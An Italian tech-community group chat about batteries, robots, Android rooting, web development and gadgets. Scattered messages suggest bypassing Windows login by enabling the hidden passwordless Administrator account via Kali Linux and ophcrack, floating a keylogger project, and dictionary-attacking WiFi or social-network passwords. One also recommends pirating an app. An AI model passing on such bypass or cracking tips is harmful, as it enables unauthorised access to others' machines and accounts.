Non riesco a trovarlo su internet... me ne serve uno di qualita'
Lool
 il nuovo matrerial design
❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️
🤔da quante stilo ti serve? 3V? 6V? 9V?
Qualcuno mi sa rsono le 18650
Da 3.7 ognuna
Il kit è uno cinese sicuramente...
Non vanno bene devo risolvere un problema di alimentazione. Parto da li... falsi contatti possono far andar in protezione le schede
E c'è anche il nuovo MATERIAL THEME EDITOR 
🤔 ti serve uno di questi in pratica? 
?
Sì simile ma per le lipo
🤔non penso che lo trovi, serve anche un circuito per le LiPo🤔 solitamente quando si cambiano si riusa il contenitore del produttore
almeno, io quando cambio i pacchi batteria ai trapani faccio sempre cosi
Qua monta le ultra fire ...
A 3.7 ciascuna
Mi serve il porta batteria
🤔boh, onestamente non so proprio dove trovarlo
hai chiesto in qualche negozio di modellistica?
trovato
?
?
Sono di Reggio anchiiooo 
Non vorrei roba cinese dove le batterie non entrano... caspita che rotturs
?
questo è singolo
E ovviamente le ho provate 
seriamente? che zona?
io sono di Arangea
Condera
 2 passi..il mio barbiere ha il negozio a Condera, Rocco Cento
La vicino abito 
 oddio quanto è piccolo il mondo
Ok grazie provero'
non mi dire che conosci anche Domenico Assumma
fa ingegneria con la mia fidanzata
Non te lo dico... infatti non lo conosco 
 almenu c'esti n'autru riggitanu
Siamo in rappresentanza almeno
 ci siamo anche noiii
Ma giulian come mai è a Reggio?
gita con la scuola..stamattina erano al Matteotti..a saperlo prima andavo a trovarlo
E si un cucciolo di giulian da queste parti non succede tutti i giorni
qualcuno ha mai lavorato con sfml e array di pixel?
peccato che Pesavento non sia sceso vero nipote? 

Ahahhaha vero... ma sarebbe chiedere troppo
 Sono di nuovo in stock i google home mini grigi
!!!!
Scontati?
Yep
Yolo
Cose varie! Sempre!
Droni ne abbiamo?
A qualcuno interessa un case htpc?
Con telecomando
madonna se hai ragione
eeh già 
Google: "L'assistente sarà in grado di chiamare un negozio e prenotare al ristorante"
Sempre Google:
GENIO.
Beh, sono le 06:43 forse Google non è ancora sveglio
Vero anche questo
Considera che in America è notte
Eh si
Eh in che unità di misura deve dartelo scusa?
Fra quanto però?
se gli chiedi quanto dura un secondo potrebbe dirti tutto tranne proprio un secondo 
Ahahahahahah
Beh oddio è la risposta più sensata
s = second
In teoria te lo dovrebbe dare in ms
Milisecondi
Ma perché? È il secondo l'unità di misura.
In caso potrebbe dare la definizione di secondo
 storicamente corrispondente alla 86.400ª parte del giorno solare medio, definita attualmente come la durata di 
 periodi della radiazione emessa dall'atomo dell'isotopo 133 del cesio in una transizione energetica specifica
Ecco kek
Ma il secondo non era il tempo le la luce impiega a fare 100 metri?
Ma lol
Nel vuoto fa circa 300'000'000 di metri al secondo
eh infatti, la definizione avrebbe molto ma molto piú senso
Nope, è il tempo che ci impiega un isotopo particolare del cesio cesio ad effettuare 9 miliardi circa di transizioni tra due stati ben definiti
Il metro è la distanza che percorre la luce in 1/3e8m circa
E adesso guyz tenetevi pronti che verso ottobre verrà annunciata la nuova definizione del chilogrammo
mio cugino mi ha raccontato che la prof di arte gli alzava le mani
a tutti però
Denuncia 
Yep, e il bello è che sarà una definizione, quindi la sfera può anche andar persa
*cilindro
Le batterie sono 18650
che linguaggio e?
*segue*
segue?
Xml a occhio
xml
è anche scritto in basso a destra come in tutti gli editor decenti
okay. Ho aperto un progetto di un prog con sublime ed e spuntato questo,io aspettavo dei simboli a caso ma no
Mm si beh non è detto che azzecchi
beh generalmente se crei un file con estensione .xml sarà un file xml e quindi lo vedrà con file xml
Se faccio un file .c ma scrivo in java sono coglione ok, ma... 
eh ma li non avrebbe senso
U sure? 
Yep.. seguivo la conversazione.. interessava anche a me..
yap
Ragazzi ho un prog,voglio trovare il suo exe ma non so dove si trova..cioe lo posso aprire con win+R,ma come posso trovare la via verso .exe?

ah vabene trovatoo
Ieri volevo installare fences,ma devo pagare,poi ho installato fences1.01 che e gratuito
Google Assistent knows what the superior programming language is



by 
Come al solito Google ha fatto le cose un po' con i piedi
ah già 
A sinistra dice una cosa, a destra un'altra

Why?
Lol l'87? Dai è un errore
Esatto
Da una parte dice 100, dall'altra 87, e alla fine quello giusto é 54
Uh no
ragazzi l'alternativa di google ad IFTTT in italiano come si chiama?
🤣
Ifdisdendet?
what?
che figatà è il nuovo 
 Core MVC, ti cambia la vita per fare le Rest API, non come Switchando che ho fatto tutto a mano da zero, webserver compreso con tutta la codifica dei dati
Quando devi progettare i mockup di un'intera applicazione su Figma ma vuoi anche triggerare 
wtf
Comunque questo è quello che dovrebbe essere l'applicazione che stiamo sviluppando (ma che non funzionerà veramente, è solo un progetto per una valutazione)
ma è in html o è interfaccia nativa di Android?
É un mockup
Come se l'avessi fatto su Illustrator, solo che il programma si chiama figma
Pheego
Ma che hahahahahahahaha
e poi, se volessi veramente metterlo in un'app?
non puoi esportare le foto, se sono animate dopo
Ma sbaglio o telegram non va per niente bene?
why?
Ogni due per tre dice aggiorno...
eh sta cercando se sono arrivati messaggi
Eh si
Ora non più?

era a te che lo faceva, che ne sò io 
Una nostra prof dice che se mettiamo immagini di lei su internet ci denuncia 
ahh capito
lo sto già vedendo
Anche io lo sto guardando
notare la finestra di Telegram che nasconde il codice closed source di Switchando Cloud
Sto vedendo anche io
Io sto aspettando di arrivare a casa per mangiare e scrivere l'articolo 
 Se vuoi faccio io
nono, tranquillo 
Magari non è un personaggio pubblico
Qual’ è il telefono xiaomi più economico?
Ragazzi scusate qualcuno saprebbe spiegarmi perché questi circuito è fatto così?
Dall'alto entra la 220 e da sotto fa la scintilla quando si uniscono i due cali
Capi
elevatore di tensione con diodi e condensatori
Ahh sei all'ITS a Padova?
si
Ok, il mio vicino di banco mi ha spiegato

anche una nostra
Lo sto facendo anche via codice su android
Non ci vedo nulla di strano
Mahonna, pizza e coca 5 euro, ma dove cazz sono finito, qua risparmio io, al nord almeno 7 euro la pizza + 3 di coca
Trancio o pizza intera?
ragazzi scusate ho un problema, vorrei andare nella cartella WindowsApps ma mi dice che non ho le autorizzazioni
come le ottengo?
C’è il comando sudo su windows?
Sei amministratore?
No
credo di no
Io devo cancellare una cartella Windows ma non voglio formattare per il momento... Sono riuscito a cancellare quasi tutto ma alcune cose chiede il trustedPilot o qualcosa del genere... Sapete nulla su come cancellare una cartella pur avendo i diritti administration?
Devi essere amministratore
Mai provato... Non so
come posso accedere come amministratore?
Il problema è che per sbaglio ho rotto il resistore (indicato con le freccette in alto) a sinistra...che ci fa se lo salto??
Ti serve la password
Dell’utente amministratore
rischi se non lo metti, poi io se volessi fare un elevatore di tensione lo farei in maniera molto differente
Kali Linux e attivi l'utente "Administrator" nascosto di base che è senza password. Poi entri con il tuo utente e quando autorizzate metti nome utente "Administrator" e password lasci vuota.
Così non devi chiedere niente a nessuno.
Finziona da Windows 7 in poi. Su Windows XP non ho mai provato. Assicurato su w10
È di una cinesata per le zanzare lo volevo portare come approfondimento per un'interrogazione di fisica (stiamo facendo i condensatori) solo che nel togliere le cose inutili dal circuito (c'era la roba per i neon) ho staccato quel resistore
Utility: ophcrack
1) se quel circuito è connesso direttamente alla 220V rischi la folgorazione se non stai attento
Lo schemino l'avevo fatto prima di rompere il tutto 
Perché?
2) ci sono esempi di utilizzo di condensatori molto piu interessanti e utili
Tipo?
Volevo fare qualcosa di carino
i condensatori non si scaricano istantaneamente, se non scaricati potresti beccarti una scarica poco piacevole di qualche centinaio di V
Intera intera
Obv
Ah sì questo lo sapevo infatti li scaricavo manualmente di solito (unendo le estremità finali)
di tutto, dai semplici filtri per sengali elettrici, all'uso negli alimentatori come stabilizzatori o l'uso come elemento per generare circuiti risonanti
Ok grazie daró un'occhiata
Se uso il circuito senza quel resistore si brucia?
Perché con qualsiasi sbalzo sono cazzi?
Cioè senza il punto interrogativo 
Ma è possibile che prenda 5 scritto e di orale nello stesso giorno
Ora mi entra l'FBI in casa
Ho un meme sull'FBI..
Dove

Ho la versione italiana
Escila.
HAHAHAAHHAAHHAAHAHAHAHAHHA
Like se l'hai letta cantand... ah no aspe
Woot??
Io mi piego quando leggo quella in inglese..
 nn capisco una cosa che mi ha fatto paypal
lol
Ecco cosa diceva in realtà... Enrico Papi era un metereologo
Mica era un gruppo cristiano questo
ah
come suona
dio santo i bassi 
esistono gli equalizzatori 
Ahahahah
Taglia l'high end nei bassi
E mettili in mono se possibile
ODDIO
Ho appena trovato un bug di Android
se blocchi il tuo telefono a distanza tramite i servizi rescue Google, basta chiudere e riaprire lo schermo e il blocco sparisce
beh sarebbe un problema...
eh infatti
Dipende molto dal tuo telefono
Qualcuno saprebbe consigliarmi un buon telefono fascia 200€-300€? Ho visto lo xiaomi mi a1, c'è di meglio o è un ottimo acquisto?
Fatta tu? 
magari
Neh
Xiaomi redmi note 5 pro o xiaomi mi 6x (senza banda 20) o xiaomi mi note 3 oppure xiaomi mi mix 2 (nettamente superiore, ieri era in offerta ad esempio)
qualcuno di voi ha studiato la spinta di archimede?
si lhanno scorso
ho risolto, non avevo la misura di un oggetto e non mi trovavo
Ci piace correre dicono
fatto
Fix?
beato te che ce l'hai
se funzionasse
Quelli corrono poco 
Al tg c'era uno in primo piano che sembrava cicca
Ma ti funziona il riconoscimento della faccia? Perché a me succede a volte ma a parte l'avviso funziona tutto
no..
non me lo fa configurare
Ah
Prova a riconfigurarlo
Di altervista
Nuovo sito fatto con WordPress
WordPress usato come CMS?
O come site builder?
.
Posso insultare a tutta randa?
DIO MIO
Ahahahah vai
NON E' SCIENZA NERA FARE UN SITO, CAVOLO!
È blu
ESATTAMENTE
Quella blu è bella ma al contempo ti penetra l'ano come CSS sa fare
come faccio una pagina in php che ogni 50ms aggiorna i dati in real time?
non che si aggiorna altrimenti impiegherebbe un sacco di tempo
AJAX
Scusate...
AJAX
JBL go o cassa aukey?
loool
synced
Con php fai il backend del server
Ahah
facile ajax?
Non troppo
Non è un linguaggio
Devi sapere un po di jQuery
Qualcuno ha un buon tutorial anche in inglese per nodejs?
qualcuno può farmi un programmino che prende i dati da un db e li mostra in ajax? non riesco
Faccio schifo su web development, io sviluppo app mica siti. Di solito uso django per un database e ajax semplicimente con jqueri modifichi l’innerHtml di un tag html. Un’altra cosa, i dati li ritorni dal server come json
Ragazzi come faccio a passare i valori di tutti i membri di un public array a un private array? C++
Con una funzione?
si lo so,ma non capisco come farlo,prima ne ho fatto uno poi ho capito che non funziona. Praticamente faccio cin » <qualcosa> e i membri del private array devono diventare quel <qualcosa>
Pointer?
Infatti uso anche quelli  cmq ho pensato un modo
ma... come faccio se devo cambiare i valori di tutti i membri del array ? es. Ho SaveData(string (&array)[numero]); nel public quando creo la definizione cosa metto al posto del [numero] per poi non avere degli errori?
Non lo so sto imparando c++, non sono un esperto
ah ok
Django per database??
si
non come database, ma come backend
forse è più corretto dire così
Direi che cambia
Spiegate che significa?
Provata ma preferisco notify & fitness for mi band
Quanti di voi hanno lo Xiaomi MiBand 2? Ho scoperto che con l'app Mi Band Tools (sul playstore) potete:

 Leggere i messaggi e le varie notifiche sul display (invece della sola icona)
 Mettere notifiche personalizzate per app o per contatto
 Impostare misurazione battito cardiaco a intervalli regolari (tipo una volta all'ora sempre e non solo durante il sonno)
 Avere in questo modo anche grafici del battito cardiaco oltre a quelli di sonno e passi

In più in combo con l'app Sleep As Android:

 Sveglia intelligente (date una finestra di mezzora in cui svegliarvi e lui sceglie il momento di sonno leggero in modo da farvi svegliare belli riposati e subito attivi)
 Usare la modalità sonnellino, in cui vi sveglia automaticamente dopo 30 minuti
 Impostare un anti-russamento: il telefono ascolta e il miband vibra, in modo da non farvi più russare

L'app costa 3€ ma glieli ho dati volentieri, mi ha veramente aperto un mondo
🧐🤔
🧐
A A A A A GENIUS
Quei salvavita di cosa sarebbero?
Si hahahah
Foto da Facebook 
 Ma sei un grande 
Ho subito acquistato l'app e ora la provo 
AHAHAHAHAHAHAH
BTW anche sleep as android si pagherebbe dopo le prime due settimane, ma basta che guardi 30 secondi di pubblicità ogni tanto e te lo lasciano gratis
Really? 
non installarla come apk
serio?
non è troppo difficile, basta un po' di pazienza per patchare a mano lo script di opengapps per installare solo quello che ti serve
Si, oppure scarichi l'app licenza da Aptoide 
Ma annullo la garanzia?
che brand è?
Ah perfetto
Fai la cosa legale (**nah scaricala da Aptoide**)
Oppure la compri con i soldi di rewards
Mi fa fuori quasi metà credito di rewards
6€ 
Addirittura
ma di cosa state parlando?
E come?
.
si presume tu sappia già cosa sia opengapps e cosa sia una custom recovery
Degli ultimi due messaggi sul canale telegram e della trusted face
ok
figata il nuovo material
Stavo dicendo a marco la stessa cosa
Più o meno è diventato un "fai come ti pare ma basta che nei pulsanti e nelle card ci sia un'ombra"
ho appena chiesto a un mio amico di scaricare anydesk, non lo trovava e mi ha mandato uno screen che ha cercato "enidesc" su Google
.
Marcoooo
Te che sei bravo
Spiega
Illuminami
Ahahahahahahahahahahahahahahahahahhahahahahahahahahahahahahahhahahahahahahahahahahahahhahahahahahahahahahahahahahahahahahahahhahahahahahahahahahahahahaahahahhahahahahahahaahhahahahahahahahahahahahahahahahhahahahahahahahahahahahahahahahahahahahahhahahahahahahhahahahahhahahahahahhahahahah spero stia trollando
Noooo
no
ma anche no
Inizio a preoccuparmi
Oh infami, rispondete a questo 
ah boh, e che è?
La mia paranoia ahahahah
È l'apk di Spotify, su virus Total
Mi porta un pericolo su 69
comunque voi avete problemi con Fastweb?
Perché io ho Fastweb e non ho problemi, un mio amico ha Fastweb e non riesce a caricare il 90% delle app e pagine web, per ora ha trovato che gli funzionano Google, i social, yt, steam e csgo, il resto non va e gli da timeout
Ma non ci capisco nulla di quel grafico 🤷‍♂️
Ho Telecom
che sono tutte le interazioni con l'esterno che fa l'app
Mi devo preoccupare?
quello col simbolo del telefono sono chiamate a delle api web normalmente
Lo prendo per un si...
mentre la scatola sono i file che contiene allegati all'interno
a me funziona tutto bene, fastweb fibra 200
ma sono l'unico a cui non attivano la 200?
i miei vicini hanno la 200 e io la 100
il router che mi hanno mandato è da max 100Mbps e il mio nuovo router non funziona perché Fastweb mi ha lockato la linea per funzionare solo con i modem loro
Eh ma cristo
Uno peggio dell'altro
Ahahahah
l'hai scaricato da mediafire?
Secondo me hai sfiga 🤷‍♂️
No
Adware
ah bho, a me ci hanno messo 1 anno per attivarlo prima avevo una lurdia 7mega che andava a 3
Ciao a tutti ragazzi come state?
Male
Sto che devo alzarmi tra 5 ore e mezza
Ma proprio fisicamente
Per cui notte
Azz
Io ho messo la sveglia a mezzogiorno 
Per fortuna che la prossima settimana per me è l'ultima di "scuola"
Che culo
Anche se ho 8 ore tutti i giorni
Io ho fino all'8 giugno
Con tanto di interrogazione fissata l'ultimo giorno di scuola
Si ma poi ho due mesi di stage
Io ho le gambe a pezzi; oggi pomeriggio ho camminato 30km per tornare a casa
Anche io se me l'accettano
Per colpa di quel l’autista stronzo
What
Insomma stai molto meglio di me
Figa cambia la scritta sopra quando la gente è già salita
AHAHAHAHAHAH
Ho già provveduto a segnalare, l’ultima volta ne ho fatto licenziare uno perché mi ha chiuso la gamba nella porta ed è partito trascinandomi per 50m
Mi fai ricordare l'altro giorno, fai conto che (sono di Roma) per tornare da scuola devo prendere un minimo di 2 e un massimo di 4 autobus (prendo quello che passa prima), prima da scuola vado sulla Nomentana con il primo che passa, poi da lì posso prendere il 60, che è diretto a casa, oppure, quando non passa il 90, e poi cambiare dopo... L'altro giorno mi sono addormentato sul 90 pensando fosse il 60, che in un'oretta mi porta a casa, ma mi sono trovato in tutt'altra zona yee
Ma che cazzo di compagnia di trasporti è
Almeno gli autisti dell'ATAC sono gentil*ehm, quasi sempre gentili
Io... Beh, in 5 anni di superiori ne ho viste di tutti i colori
Però devo dormire, notte
Quel quasi perché ho assistito a liti tra autista e passeggeri
È sempre un casino madonna
Locatelli

Però mi è andata bene perché conoscevo la zona
E ho saputo orientarmi per trovare un autobus che mi ha portato in un'altra zona che conoscevo, e da lì sono riuscito a tornare a casa
Yep.. io quando mi addormentai sul pullman, alle superiori, finii a grosseto..
A qualcuno interessa case htpc con Telecomando ir?
Modello antec fusion remote max
Senza ali ma con ventole filtri e viteria
Sarebbe figo per un mio progetto... Ma non posso spendere, quindi no
Muoio ahahahah
Haha
Quando puoi spendere scrivimi magari ce l'ho sempre

Ma che spendere! Lo vuole regalare 
30 euri+ss
Le SS non sono illegali?
Addirittura aggiungere il supplemento per il logo delle Schutzstaffel stampato sopra

Il tribunale di Norimberga dovrebbe aver già risolto questo fatto...
Ma fiere per sti robottini ci sono?
Ho fatto l'ypgrade con il radar.
non spammare 725 messaggi 
Samsung
Ho già trovato lo zip da flashare
Erano giusto 5 per far leggere 
Ma una cosa simile la posso fare col raso?
Rasp
Io ne ho fatto uno per un concorso
gli altri hanno l'isis, noi abbiamo l'ATAC
Copiatissima
Ingredienti: 320g di eclipse buggato
sattamente
è vero 
Different levels of programming



by 
Che concorso???
Vorrei farlo anche io...
Ma sulla io studio ci sono 5€ precaricati?
Ma Eclipse Ide chi lo utilizza e per cosa?
Che concorso?
Voglio farlo anche io...
Ormai è finito è solo per scuole superiori
Ah... va be io sono docente itp
Avvisatemi quando esce...
Nessuno mi risponde?
Ho montato il radar
Ma ho un problema di alimentazione... dopo un po' si spegne tutto...
Penso alle batterie oppure all'involucro.. se non e' così inizio a cambiare le schede
C'è sicuramente qualche corto... si spegne tutto...
Ma non so da chi è provocato... ho scollegato tutto e con il multimetro il pacco batterie mi segnava circa 1v invece che 8v circa
Lorenzo licenza radio?
2 batterie AA per per alimentare arduino e 4 motori mi sebrano poche
Sì ho pensato anche io infatti ho preso le 9900mAh
Yes
Le Li-ion non hanno l'effetto memoria
Quella tensione di 1v sul pacco batteria con tutto scollegato mi fa pensare...
Anche io comunque...
Ho la licenza...
Se pensi ci sia un corto stacca tutto e riattacca una sezione alla volta per capire dove è il problema
1V con tutto scollegato? Allora le batterie sono scariche
Non capita spesso...
Può darsi che fanno schifo... comunque cambio prima quelle
Poi il contenitore....
Dopo passo al connettore ... e poi alle schede...
Se non dovesse bastare... ai 4 motori...
Ma non credo che arrivero' li... risolvero' prima...
Poi appena riattacco l'interruttore sul pacco... come per magia si riattacca tutto...
1v sembra un corto... pero' le batterie non si riscaldano .... e stranissimo.... secondo me fanno pena...
Io ne avevo usate 12 più power bank
Sono quelle cinesi. ..
Sono queste 3000 mAh
Offrivano le 2800 mAh forse di qualita' superiore...
Voglio mettere un modulo stabilizzatore per alimentare più di 3 sensori... non vorrei toccare il limite...
Quella sotto e una mia traccia per il laboratorio ....ahhhh
Quelle batterie sono da 1.2V, uindo mettendone 2 insieme arrivi a 2.4V. Questa tensione difficilmente basta per alimentare anche solo gli alimentatori
No 3.7v
Comunque devo iniziare a sostituire ... altrimenti il problema non lo risolvo
Ah, mai visto batterie di quel formato con una tensione cosí alta
Li-ion utilizzate anche nelle sigarette elettroniche...
Non sono lipo da modellisti...
Sono un po' diverse e pi grandi e  in confronto alle AA
Le ultrafire sono abbastanza cinesi... proverei con delle batterie più serie oppure direttamente utilizzando un alimentatore al posto delle batterie facendo attenzione a mettere sempre un limite di corrente per evitare altri problemi. così almeno si escluderebbe la possibilità delle batterie.
No... alimentatori come faccio... non deve essere alimentato dalla rete
Sempre con le batterie...
Le cambio con le 9900mAh così evito sbalzi di tensione sugli spunti dei motori.
beh era per fare i test ed escludere la zona batterie/contenitore dal problema, se si risolveva allora il problema era sicuro o le batterie o il contenitore
ragazzi vi ricordate i comandi da rinnovare nell'episodio 3 di domotica?
Sì.... comunque è scomodo...
Le 9900 mi dovrebbero dare più stabilita'
Altrimenti passo alle 12000 ma secondo me e' inutile
Dovrei passare a sostituire il contenitore...
9900 e 12000 sono belle potenze...
Non c'è poi grande vantaggio ma rispetto alle 3000 si...
Va be venite fuori... chi ha un po' di esperienza con questi robottini?
Io ho fatto con 8 batterie per il motore 3 per il servo motore e una power bank da 10.000 milliAmpere per arduino
10 A per arduino...
Ma quanti atmega montava????!!!???
Ma che cosa era??
Era grandicello
Comunque se avete progetti o idee postate... a me interessano..  io ancora non ho prodotto nulla....
Boh il circuito l’ha fatto un mio amico io ho fatto il software
Ma ho modificato i file per l'utilizzo DEL L'IR e gestione motore.
Foto?
Ah simpatica
Perche' così tanta potenza per un robot?
10 A per arduino e quanti volt?
Ogni volt che vuoi
Anche più del necessario, cioè overVolt
Va be... esagerato
Ciao ragazzi, ho un nebulizzatore/umidificatore che va alimentato a 24v 1A, ma io ho solo alimentatori che vanno da 1,5v a 12v. 

Cosa potrei mettere x portare l'alimentazione a 24v ?
Metterli in serir
Serie...
Mettili in serie...
Non rischio di far saltare all'aria tutta casa ?
Perché?
24w
Di potenza
Negativo nel positivo dell'altro alimentatore... ti rimane un positivo e un negativo per alimentatore...
Se ne hai due...
Bho mi impauriva collegare tra loro 2 alimentatori collegati alla 220v

Cmq se dici che non c'è pericolo è un'ottima soluzione 
E perche dovrebbe esserci...
Grazie, mi rassicuri 
Solo xké sono ignorante 
Vedi ti gli schemi bene
I moderni alimentatori a due canali dovrebbero avere questa funzione...
Altrimenti la realizzi tu con i cavetti...
A 2 canali ?
Si pensavo con i cavi direttamente
24 v × 1A = 24W una n potenza misera comunque

Sì due canali di alimentazione.
Gas che scuola frequenti?
Io userei 2 alimentatori super cinesi
Sì potrebbe andar bene...
Magari ancora a scuola  (magari si riferisce all'etá )

Sono laureato in Informatica
A me quelli cinesi hanno rovinato 2 hd
Hd ? 
HardDisk ?
Si
2 rovinati...
Ahhhh hd esterni
Dovresti sapere tutto...
Interni
Si proprio onniscente 
Avevo montato una discreta potenza
Alla fine ho pagato con 2 hd... non riuscivo a capire il problema.... era l'alimentazione...
Ma hanno sfiammato ? O sono semplicemente morti ?
No si è fermato tutto...
Ho acceso e subito schermata blu
Uhmmmmm
Poi ho fatto i controlli... e sono usciti problemi....
BSOD significa che l'hd partiva, ma ad un certo punto crashava il caricamento di Windows
Sì. .. danno fisico
Ahi ahi 
Dove ti sei laureato?
In informatica???
Gas dove sei?
In pratica il progetto che sto facendo e fatto bene... solo il secondo step presentava errori sintattici nel sorgente...
Non mi piace pero' che tra uno step e l'altro abbiano dovuto staccare i sensori e che l'header file non sia aggiornato in base agli step....
Qualcuno ha un sito internet?
621 membri e nessuno risponde
Mica era uno youtuber?
Boh mi sembra di averlo già sentito
Dici?
Boh era quello alto biondo?
ragazzi mi consigliate un programma sfizioso(so che è soggettivo) per voi da fare in c#?
Una calcolatrice
mmhhh...dipende, quella standard è troppo semplice, dici una che calcola le espressioni?
Come vuoi tu
mmhh, ok però sono sempre aperto a proposte più allettanti
In' intelligenza artifiale
devo ancora studiarla, cavolo mi manca
Una gui
forse ho capito, provo con un keylogger, anche se non so se sia facile o difficile
Non sono batterie AA. Sembrano 18650 .
Se vuoi ok, ma io intendevo un'interfaccia grafica
.
sisi però ho pensato che con visual studio è facile fare interfacce grafiche, quasi
A ok
Scusa, ma riesco a telegrammare ogni tanto. 

Università degli studi di Pisa
Logan Paul?
Controllare le periferiche oppure un interfaccia grafica che riporta i dati provenienti dalla mia robot car via wifi o altro. 
.
Ok. Capito
Io ho una versione vecchissima di Eclipse Ide  ... con questa ho preparato l'esame di programmazione nel lontano 2003/2004
Con Java ha sempre funzionato bene...
IU8AEW
Il mio nominativo
Che app mi consigliate per attivare i permessi di root senza il PC?
Che comunita' java conoscete per sviluppare programmi??? Mi piacerebbe farne parte....
Che ve ne pare del mio generatore di sudoku?
Con cosa è fatto?
Per intanto genero la griglia poi tolgo alcuni numeri ed infine faccio il controllo
C# e windows form
Ah ok
Dato che la prox settimana ho la verifica io mi esercito così
Instagram down?
Confermo è tutto giu...
Yess
Ma chissene, tanto meglio
Ma
ecco mi sembrava
Vabbuò oggi l'importante è che non va down Spotify, non riesco a programmare senza
Colpa di Toto
Ha caricato una storia sul pesto al tartufo a marchio Amazon e da quando l'ho aperta è crashato tutto

Ma secondo voi si può creare un programma c++ che mettendo il nome della wifi trova la password se la lasciata uguale
Non la cambiata
Cosa? Un programma che trova password dei wifi?
Fai conto che Samsung ha una roba chiamata Knox
Appena flashi qualsiasi cosa non di Samsung, Knox si trippa e non potrai più aprire molte app di Samsung, e alcune app non ti considereranno il telefono sicuro
E Knox non è ripristinabile, giusto flashando la stock e facendo un wipe data e cache c'è la possibilità che funzionino di nuovo tutte le app
Oppure fai il root, modifichi una stringa nel build.prop e tutto torna a funzionare, però se fai il root devi stare attento al SafetyNet perché potresti non poter scaricare più alcune app da Play Store
Che complicato fare il root ora
Nah
Esiste Magisk
Però il suo dev ora sta facendo il servizio militare obbligatorio nel suo paese e non lo può portare avanti 
Yes e volevo sapere se si può fare ho è impossibile
Se trovi una falla nella sicurezza di wpa2 è possibile
Cioè, è praticamente impossibile
Quindi manco con brutforce
Scusa come lo scritto ma volo dire forza bruta
Non è efficiente, ci metteresti troppo con le password tipo Tgjwi749Grk$lHdH
Dei moderni router
Io non ci provo neche se mi pagano allora
Forse in qualche mese ne trovi una
Cercherò un altra idea
Perché in questo momento sono a corto di idee
Qualcuno li ha?

 ‎€4‎.4‎0 ‎in‎ve‎ce‎ c‎he‎ €‎10‎.99
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 5‎9.‎96%
✂ 
: 

 

Non esistono delle "liste" di queste password?
Cisco 6880 Tutte le porte a 10Gbps
Bello
40000€ circa di switch!!
Una curiosità fai il sistemista?
'Mmazza 
Chi di voi ha 3?
Esistono dei "GB aggiuntivi" che durano un mese?
Ho finito i GB e rinnovano il 18
Lascia stare... Comunque lascia che prima ti consigli di studiarti un po' di italiano, poi passa al c++
Paghi quanto usi da adesso al 18
Un bordello
Mmh... Qui c'è lo zampino di 

Una chicca
Che vi piacera
Ma cmq per i social net brute force con keyword è  bello
Brute force fallo con i set di dati delle password più utilizzate, come 123456 e password123
70€ di mouse? Ma si pacc?!
E con quale tool?
Questo attacco ha un nome specifico 
Non sono un hacker non andiamo nel tecnico
Si
Dictionary attack
Ecco, già iniziamo a ragionare
Te l’ho detto, non sono un hacker 🤷‍♂️
C'è qualche qualcosa sul blog ma non aprofonditissimo...
Come controllo il saldo della io studio?
Ancora devo attivare la funzione di prepagata ma l'username che ho non è valido
No, il ladro.
Conoscete qualche driver motori in grado di gestire 5/6 ampere ?
L'l298 non regge e sembra andare in protezione
Raga
Ma dov'e il video di overvolt del drone
Ahahahah
Quello dove spiega su come programmarlo
Perché usi un profilo fake? 
Perché lo uso per i troll.
Per i morti f***
Lol
oddio scusate ho sbagliato gruppo
Ce qualcuno che mi puo rispondere??
Allora??
Nessuno puó
Ma cercalo sul canale
Non lo trovo
Tb6600
Sia sul canale che sul blog
Mi sa che non avete capito
Nel terzo video diceva
Che avrebbe fatto un quarto video nella quale spiegava come programmarlo e come configurarlo
Sono 5 gli episodi
Ma aspetta, intendi il primo, il secondo o il terzo drone?
Adesso guardo
per quale motore ti serve?
Mi serve per 2 motori 12v con motoriduttore
Sugli l298 ci potevo cucinare dal calore
Controlla 2 motore il tb6600.. ma 4ampere a canale o per entrambi?
ma motori dc? il tb6600 è per motori passo passo 

Si motori dc
Ah vero
Pensavo avesse i due canali separati
Ne conosci uno dual bridge  per due motori che arrivi in fretta?
Marco, nel video finale hai detto che avresti fatto un altro video nella quale descrivevi come programmarlo
No
Di quale drone? Sono usciti tutti gli episodi di tutti e tre i droni quindi se non lo trovi cerca meglio 
Azz
I tre episodi li trovo, ma non trovo l'episodio che ne descrive la configurazione software del drone
Ancora non capisco a quale dei tre droni ti riferisci però
Mi riferisco al drone 450 della DNI
DJI
Al kit?
Sono 5 gli episodi
Strano....io ne ho trovati solo tre sul tuo forum
Va be.....cerco meglio
Ok l'ho trovato
Grazie
Io ci lavoro o meglio ho lavorato per 6 mesi ora sono su un altro progetto se volete info, per quello che so posso aiutare
Ah sisi sul blog non hanno ancora finito di fare gli articoli


   
Ok

Ma hai fatto qualche serie nella quale costeuivi droni incentrati sulla velocità e non sulla stabilità???
Nup... devo farlo, un racing
Ok
Quanto fa 1000-7?

271
Hehe
Tanto per chiedere anche qui
vi piace?
Ho il trucco supremo per capire se la traccia è masterizzata bene
Le casse del mio PC
questa non è la versione stereo però, la trovi nei producer
E mia madre con lo zoccolo in mano perchè sto facendo casino
quella stereo è waay più figa con le casse

Fai un Mavic come Creative Channel
ragazzi chi mi aiuta? Mi serve una mano con il sonoff touch, funziona alla perfezione, ma devo collegarlo con un relay come posso fare? non c'è un modo per fargli mandare un impulso e non switchare?
Il sonoff ha già un relay
Riprogrammarlo
si lo so ma ho la necessità di collegarlo ad un'altro relay già installato nell'impianto elettrico
una wiki per i comandi c'è?
Allora senza andare nel complicato basta staccare il relay del sonoff e con due fili di prolunga collegare al suo posto quello che hai già nell'impianto
si ci avevo pensato ma pensavo esistesse una funzione via software
Mah... Secondo me fai prima a sostituire il relay...
eh.. il problema è l'impianto perchè ho altri due interruttori collegati allo stesso relay per spegnerlo in più punti della stanza
Sono due deviatori giusto?
Se sono due deviatori li colleghi al pulsante del sonoff
non ho capito 
Il sonoff ha un pulsante
Basta che saldi i due fili degli interruttori che hai già ai capi del pulsante
NON CI CREDO
NO NON È POSSIBILE
LE STORIE ANCHE SU YOUTUBE
Sono in test da mesi
No
No
Ci stanno su YouTube secondo me
No
No
No
Oddioooooo 
È l'unica piattaforma in cui hanno davvero un senso
No
effettivamente... ma ormai sono un cancro letteralmente, si diffondono a macchia d'olio
tra poco arrivano le storie su SoundCloud se continuiamo così 
Sì ma, il vero problema è: Snapchat ha i diritti per questa roba
Si
Se snapchat rompe le scatole a Google potrebbe smettere di esistere in mezzo secondo
È una domanda o un'affermazione?
Spero di sì comunque, le hanno inventate loro ed è giusto che ci guadagnino
Affermazione
